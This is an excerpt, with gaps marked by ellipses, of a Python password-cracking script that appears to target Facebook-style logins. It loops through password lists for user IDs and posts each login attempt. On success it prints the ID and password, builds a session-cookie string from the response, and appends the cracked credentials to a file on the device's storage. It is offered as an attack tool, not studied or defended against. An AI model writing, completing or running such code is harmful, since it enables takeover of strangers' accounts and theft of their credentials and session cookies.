...
sys.stdout.write('\x1b]2; (☠️)EX🛠️ARIYAN💚🥀(☠️)\x07')
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;244m({Y}EX🛠️ARIYAN💚🥀-CP\x1b[38;5;244m){Y} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MR×SPJL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
...
def rndm1(uid,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r\x1b[38;5;244m(\x1b[38;5;46mEC🛠️ARIYAN💚🥀-OK\x1b[38;5;244m)\x1b[38;5;46m '+uid+f' ━\x1b[38;5;244m➤\x1b[38;5;46m '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        ...
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;244m({Y}EX🛠️ARIYAN💚🥀-CP\x1b[38;5;244m){Y} '+uid+' | '+pas+'\033[1;97m')
